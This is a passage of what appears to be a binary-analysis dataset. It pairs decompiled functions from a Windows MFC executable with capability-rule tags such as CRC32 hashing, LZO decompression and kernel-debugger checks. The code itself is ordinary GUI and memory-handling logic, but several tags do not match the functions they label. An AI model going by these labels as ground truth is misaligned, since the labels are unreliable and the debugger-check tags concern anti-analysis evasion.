_sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.00434fe8();\n        noname_11 = *0x450d78;\n        noname_8 = *(iVar1 + 8);\n        noname_0 = 0x8;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            noname_0 = &var_34h;\n            var_34h = 0xb;\n            iVar1 = fcn.0041d965(noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0xb, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, *0x450d78, var_18h, in_stack_ffffffe8, \n                                 \"AfxWnd70s\", 8, var_8h, var_4h, unaff_EBP);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            iVar1 = fcn.0041d965(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, var_34h, var_30h, \n                                 in_stack_ffffffd0, in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, var_18h, \n                                 in_stack_ffffffe8, \"AfxOleControl70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            iVar1 = fcn.0041d965(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, 0x10, in_stack_ffffffe8, \n                                 \"AfxControlBar70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            iVar1 = fcn.0041eacf(&var_34h, \"AfxMDIFrame70s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            iVar1 = fcn.0041eacf(&var_34h, \"AfxFrameOrView70s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0041e32b(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0041e32b(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0041e32b(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0041e32b(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0041e32b(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0041e32b(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0041e32b(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0041e32b(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0041e32b(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0041e32b(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0041e32b(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0041e32b(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0041e32b(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.0041e32b(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 2275
    },
    "00422b5c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00422b5c(uint *param_1, uint8_t param_2)\n\n{\n    uint *puVar1;\n    \n    if ((param_2 & 2) == 0) {\n        fcn.00402350();\n        puVar1 = param_1;\n        if ((param_2 & 1) != 0) {\n            fcn.0041bae1(param_1);\n        }\n    }\n    else {\n        puVar1 = param_1 + -1;\n        fcn.0040bcea(param_1, 4, *puVar1, fcn.00402350);\n        if ((param_2 & 1) != 0) {\n            fcn.0041bae1(puVar1);\n        }\n    }\n    return puVar1;\n}\n",
        "token_count": 182
    },
    "00424e09": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424e09(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 376
    },
    "004251f1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004251f1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00402330();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 == NULL) {\n        fcn.004198e6();\n    }\n    uVar2 = (**(*piVar1 + 0x18))(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 1;\n    fcn.00403700(uVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.00401180();\n    uVar2 = *(unaff_EBP + 0xc);\n    extraout_ECX[4] = 0xffffffff;\n    extraout_ECX[6] = uVar2;\n    extraout_ECX[1] = 1;\n    extraout_ECX[7] = 1;\n    extraout_ECX[9] = piVar1;\n    extraout_ECX[0x10] = (-((~uVar2 & 1) != 0) & 0xffffffd0) + 0x40;\n    uVar2 = *(unaff_EBP + 0x14);\n    extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[0x11] = 0x89;\n    extraout_ECX[0xc] = uVar2;\n    extraout_ECX[2] = 0;\n    uVar3 = (**(*piVar1 + 0x50))(3, 0, 0, 0);\n    iVar5 = *(unaff_EBP + 0x10);\n    extraout_ECX[3] = uVar3 & 2;\n    if (iVar5 < 0x80) {\n        extraout_ECX[8] = 0x80;\n        extraout_ECX[0xc] = 0;\n    }\n    else {\n        extraout_ECX[8] = iVar5;\n    }\n    iVar5 = extraout_ECX[8];\n    if (extraout_ECX[0xc] == 0) {\n        uVar3 = (**(*extraout_ECX[9] + 0x50))(3, 0, 0, 0);\n        extraout_ECX[2] = uVar3 & 1;\n        if ((uVar3 & 1) == 0) {\n            uVar2 = fcn.0041bab6(extraout_ECX[8]);\n            extraout_ECX[0xc] = uVar2;\n            extraout_ECX[7] = 0;\n        }\n        else {\n            iVar5 = 0;\n        }\n    }\n    iVar5 = extraout_ECX[0xc] + iVar5;\n    extraout_ECX[0xb] = iVar5;\n    iVar4 = extraout_ECX[0xc];\n    if ((*(extraout_ECX + 6) & 1) != 0) {\n        iVar4 = iVar5;\n    }\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[10] = iVar4;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 910
    },
    "00427d6a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427d6a(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *var_8h;\n    int32_t *piStack8;\n    \n    uVar1 = param_1[0x1f];\n    param_1[0x27] = 0;\n    if (((uVar1 & 1) == 0) || ((uVar1 & 4) == 0)) {\n        if ((uVar1 & 0xa000) == 0) {\n            uVar2 = 0x50;\n        }\n        else {\n            uVar2 = 0x4a;\n        }\n    }\n    else {\n        uVar2 = 0x46;\n    }\n    var_8h = param_1;\n    piStack8 = param_1;\n    (**(*param_1 + 0x134))(&var_8h, 0, uVar2);\n    return;\n}\n",
        "token_count": 220
    },
    "00427ffb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427ffb(uint arg_8h, int32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint *puVar3;\n    uint var_30h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint8_t var_fh;\n    uint var_eh;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    (**(*in_ECX + 0x110))(0x417, arg_8h, &var_18h);\n    *(arg_ch + 2) = *(arg_ch + 2) ^ 4;\n    var_eh._0_1_ = 0;\n    var_eh._1_1_ = 0;\n    *(arg_ch + 10) = 0;\n    *(arg_ch + 0xb) = 0;\n    iVar2 = fcn.0040c5d0(arg_ch, &var_18h, 0x14);\n    if (iVar2 != 0) {\n        var_20h = fcn.0041cced();\n        fcn.0041cd21(0x10000000, 0, 0);\n        (**(*in_ECX + 0x110))(0x416, arg_8h, 0);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        var_1ch = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], 0x43d, 0, 0);\n        (*pcVar1)(in_ECX[7], 0xb, 0, 0);\n        (*pcVar1)(in_ECX[7], 0x43c, var_1ch + 1, 0);\n        (*pcVar1)(in_ECX[7], 0x43c, var_1ch, 0);\n        (*pcVar1)(in_ECX[7], 0xb, 1, 0);\n        (**(*in_ECX + 0x110))(0x415, arg_8h, arg_ch);\n        fcn.0041cd21(0, var_20h & 0x10000000, 0);\n        if ((((*(arg_ch + 9) ^ var_fh) & 1) == 0) && (((*(arg_ch + 9) & 1) == 0 || (*arg_ch == var_18h)))) {\n            iVar2 = (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_30h);\n            if (iVar2 == 0) goto code_r0x00428130;\n            puVar3 = &var_30h;\n        }\n        else {\n            puVar3 = NULL;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(in_ECX[7], puVar3, 1);\n    }\ncode_r0x00428130:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 699
    },
    "00429177": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429177(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    \n    uVar6 = fcn.00429159();\n    uVar5 = uVar6 >> 0x20;\n    if (uVar6 != uVar5) {\n        param_1[0x21] = uVar5 >> 0x14 & 1;\n        param_1[0x22] = uVar5 >> 0x15 & 1;\n        if (0 < param_1[0x20]) {\n            iVar3 = 0xea00;\n            do {\n                iVar2 = iVar3;\n                iVar1 = fcn.0041cc4d();\n                if (iVar1 == 0) {\n                    iVar2 = (**(*param_1 + 0x148))(0, iVar3);\n                    if (iVar2 == 0) {\n                        fcn.00425f1e();\n                    }\n                    iVar2 = iVar3;\n                    fcn.0041cc4d(iVar3);\n                }\n                fcn.0041cdb9(-(param_1[0x21] != 0) & 5, iVar2);\n                iVar2 = iVar3 + -0xe9ff;\n                iVar3 = iVar3 + 1;\n            } while (iVar2 < param_1[0x20]);\n        }\n        if (0 < param_1[0x1f]) {\n            iVar3 = 0xea10;\n            do {\n                iVar2 = iVar3;\n                iVar1 = fcn.0041cc4d();\n                if (iVar1 == 0) {\n                    iVar2 = (**(*param_1 + 0x148))(1, iVar3);\n                    if (iVar2 == 0) {\n                        fcn.00425f1e();\n                    }\n                    iVar2 = iVar3;\n                    fcn.0041cc4d(iVar3);\n                }\n                fcn.0041cdb9(-(param_1[0x22] != 0) & 5, iVar2);\n                iVar2 = iVar3 + -0xea0f;\n                iVar3 = iVar3 + 1;\n            } while (iVar2 < param_1[0x1f]);\n        }\n        if ((param_1[0x22] == 0) || (param_1[0x21] == 0)) {\n            piVar4 = fcn.0041cc4d(0xea20);\n            if (piVar4 != NULL) {\n                (**(*piVar4 + 0x60))();\n            }\n        }\n        else {\n            iVar3 = fcn.0041cc4d(0xea20);\n            if (iVar3 == 0) {\n                iVar3 = (**(*param_1 + 0x148))(0x8000008, 0xea20);\n                if (iVar3 == 0) {\n                    fcn.00425f1e();\n                }\n                fcn.0041cc4d(0xea20);\n            }\n            fcn.0041cdb9(5);\n        }\n    }\n    return;\n}\n",
        "token_count": 712
    },
    "0042c009": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c009(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(in_ECX + 0x1c), 0x46, 0, arg_8h);\n    if ((*(arg_8h + 0x18) & 1) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &lpRect);\n        var_4h = *(arg_8h + 0x10);\n        var_ch = var_ch - lpRect;\n        var_8h = var_8h - var_10h;\n        iVar1 = *(arg_8h + 0x14);\n        if ((var_4h != var_ch) && ((*(in_ECX + 0x7d) & 4) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_4h - *0x450d48, 0, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_ch - *0x450d48, 0, var_ch, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n        }\n        pcVar2 = _sym.imp.USER32.dll_SetRect;\n        if ((iVar1 != var_8h) && ((*(in_ECX + 0x7d) & 8) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, 0, iVar1 - *0x450d4c, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n            (*pcVar2)(&lpRect, 0, var_8h - *0x450d4c, var_4h, var_8h);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "004307f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004307f4(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    uint var_4h;\n    \n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        uVar2 = (**(**(arg_8h + 0x24) + 0x30))();\n        uVar1 = fcn.00408b24();\n        if ((uVar2 >> 0x20 != 0) || (uVar1 < uVar2)) {\n            fcn.00427980(0xf105, 0, 0xffffffff);\n            fcn.00425f38();\n        }\n        fcn.00430246(arg_8h, uVar2);\n    }\n    else {\n        fcn.00430796(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00431bd1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00431bd1(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar3 = fcn.0041cced();\n    iVar4 = param_1;\n    if ((uVar3 & 0x40000000) == 0) {\n        iVar4 = fcn.0041f877();\n    }\n    pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n    if ((param_2 & 0xc) != 0) {\n        iVar5 = fcn.0041cdda();\n        if ((((~(param_2 >> 3) & 1) == 0) || (iVar5 == 0)) || (iVar4 == param_1)) {\n            (*pcVar2)(*(iVar4 + 0x1c), 0x86, 0, 0);\n        }\n        else {\n            *(param_1 + 0x39) = *(param_1 + 0x39) | 2;\n            (*pcVar2)(*(iVar4 + 0x1c), 0x86, 1, 0);\n            *(param_1 + 0x39) = *(param_1 + 0x39) & 0xfd;\n        }\n    }\n    uVar7 = 5;\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)(5);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    while (iVar5 = (*pcVar1)(iVar5, uVar7),  iVar5 != 0) {\n        iVar6 = fcn.004315b7(*(iVar4 + 0x1c), iVar5);\n        if (iVar6 != 0) {\n            (*pcVar2)(iVar5, 0x36d, param_2, 0);\n        }\n        uVar7 = 2;\n    }\n    return;\n}\n",
        "token_count": 465
    },
    "004346bd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004346bd(uint32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = fcn.0041cced();\n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    if ((uVar3 < 0) &&\n       ((((arg_8h & 0xfff0) != 0xf060 ||\n         (((iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x73),  iVar2 < 0 && (iVar2 = (*pcVar1)(0x12),  iVar2 < 0)) &&\n          ((uVar3 & 0x100) != 0)))) && (iVar4 = fcn.0041fec5(arg_8h, arg_ch),  iVar4 != 0)))) {\n        return;\n    }\n    fcn.004321db(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 225
    },
    "00436ecc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00436ecc(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t var_8h_3;\n    int32_t var_ch_2;\n    uint var_30h;\n    uint lpRect;\n    uint dy;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t aiStack92 [2];\n    uchar *puStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    int32_t iStack40;\n    int32_t iStack32;\n    int32_t iStack24;\n    int32_t var_ch_3;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    if (var_8h_3 != 0) {\n        (*_sym.imp.USER32.dll_GetWindowRect)();\n        iStack68 = -iStack40;\n        puStack72 = &stack0xffffffd8;\n        uStack76 = 0x436f05;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n        uStack76 = 1;\n        puStack80 = &stack0xffffffd8;\n        puStack84 = 0x436f15;\n        (**(*in_ECX + 0x13c))();\n        puStack84 = &stack0xffffffe8;\n        aiStack92[1] = 0;\n        aiStack92[0] = 0x407;\n        var_8h_2 = &stack0xffffffa4;\n        (**(*in_ECX + 0x110))();\n        iVar5 = (iStack32 - iStack40) + var_ch_3;\n        var_8h_3 = 0;\n        iVar4 = in_ECX[0x1c];\n        if (0 < iVar4) {\n            piVar2 = in_ECX[0x1d] + 4;\n            iVar3 = iVar4;\n            do {\n                if ((*(piVar2 + 7) & 8) != 0) {\n                    var_8h_3 = var_8h_3 + 1;\n                }\n                iVar1 = *piVar2;\n                piVar2 = piVar2 + 5;\n                iVar5 = iVar5 + ((-6 - iVar1) - var_ch_3);\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.0040a2a0();\n        var_4h_2 = 0;\n        if (0 < iVar4) {\n            iVar4 = in_ECX[0x1d] + 8;\n            do {\n                iStack24 = iStack24 + 6 + *(iVar4 + -4);\n                if (((*(iVar4 + 3) & 8) != 0) && (0 < iVar5)) {\n                    iVar3 = iVar5 / var_8h_3;\n                    iStack24 = iStack24 + iVar3;\n                    var_8h_3 = var_8h_3 + -1;\n                    iVar5 = iVar5 - iVar3;\n                }\n                *(&stack0xffffffa4 + var_4h_2 * 4) = iStack24;\n                iStack24 = iStack24 + var_ch_3;\n                iVar4 = iVar4 + 0x14;\n                var_4h_2 = var_4h_2 + 1;\n            } while (var_4h_2 < in_ECX[0x1c]);\n        }\n        (**(*in_ECX + 0x110))(0x404, in_ECX[0x1c], &stack0xffffffa4);\n    }\n    iVar4 = 0;\n    if ((var_ch_2 != 0) && (0 < in_ECX[0x1c])) {\n        puVar6 = in_ECX[0x1d] + 0x10;\n        do {\n            if ((*(puVar6 + -1) & 1) != 0) {\n                iStack68 = 0x436ff0;\n                fcn.00428f14(iVar4, *puVar6, 1, unaff_EDI, unaff_ESI, unaff_EBX);\n            }\n            puVar6 = puVar6 + 5;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < in_ECX[0x1c]);\n    }\n    return;\n}\n",
        "token_count": 1210
    },
    "00437476": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00437476(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint hMem;\n    uint lpCriticalSection;\n    \n    iVar4 = param_1 + 0x1c;\n    iStack32 = 0x43748d;\n    iStack28 = iVar4;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar2 = *(param_1 + 4);\n    iVar7 = *(param_1 + 8);\n    if ((iVar2 <= iVar7) || ((*(*(param_1 + 0x10) + iVar7 * 8) & 1) != 0)) {\n        iVar7 = 1;\n        if (1 < iVar2) {\n            puVar6 = *(param_1 + 0x10);\n            do {\n                puVar6 = puVar6 + 8;\n                if ((*puVar6 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar2);\n            if (iVar7 < iVar2) goto code_r0x00437558;\n        }\n        iVar2 = iVar2 + 0x20;\n        iStack32 = *(param_1 + 0x10);\n        if (iStack32 == 0) {\n            iStack32 = iVar2 * 8;\n            uStack36 = 2;\n            iStack40 = 0x4374de;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        }\n        else {\n            uStack36 = 0x4374e7;\n            uStack48 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n            iStack40 = 0x4374f1;\n            uStack36 = uStack48;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n            iStack40 = 0x2002;\n            puStack44 = iVar2 * 8;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n        }\n        if (iStack40 == 0) {\n            iStack40 = *(param_1 + 0x10);\n            if (iStack40 != 0) {\n                puStack44 = 0x437517;\n                puStack44 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                uStack48 = 0x43751e;\n                (*_sym.imp.KERNEL32.dll_GlobalLock)();\n            }\n            puStack44 = 0x437527;\n            iStack40 = iVar4;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            uStack48 = 0x44f070;\n            puStack44 = &stack0xfffffffc;\n            fcn.0040ab89(&stack0xffffffd0, 0x448388);\n            pcVar3 = swi(3);\n            iVar4 = (*pcVar3)();\n            return iVar4;\n        }\n        puStack44 = 0x437533;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iStack32 = (iVar2 - *(param_1 + 4)) * 8;\n        iStack40 = iVar5 + *(param_1 + 4) * 8;\n        uStack36 = 0;\n        puStack44 = 0x43754c;\n        fcn.0040bbe0();\n        *(param_1 + 4) = iVar2;\n        *(param_1 + 0x10) = iVar5;\n    }\ncode_r0x00437558:\n    if (*(param_1 + 0xc) <= iVar7) {\n        *(param_1 + 0xc) = iVar7 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar7 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar7 + 1;\n    uStack36 = 0x43757b;\n    iStack32 = iVar4;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    return iVar7;\n}\n",
        "token_count": 982
    },
    "00401520": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401520(uint *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t *unaff_EBP;\n    uint *puVar7;\n    \n    param_1 = *param_1;\n    ppiVar6 = param_1 + -4;\n    iVar2 = param_1[-3];\n    puVar3 = (**(**ppiVar6 + 0x10))();\n    iVar4 = (***puVar3)(param_2, 1);\n    if (iVar4 == 0) {\n        iVar4 = fcn.00401510();\n    }\n    if (iVar2 < param_2) {\n        param_2 = iVar2;\n    }\n    puVar7 = iVar4 + 0x10;\n    puVar3 = param_1;\n    for (uVar5 = param_2 + 1U >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar3;\n        puVar7 = puVar7 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    for (uVar5 = param_2 + 1U & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    *(iVar4 + 4) = iVar2;\n    piVar1 = param_1 + -1;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar6 + 4))(ppiVar6);\n    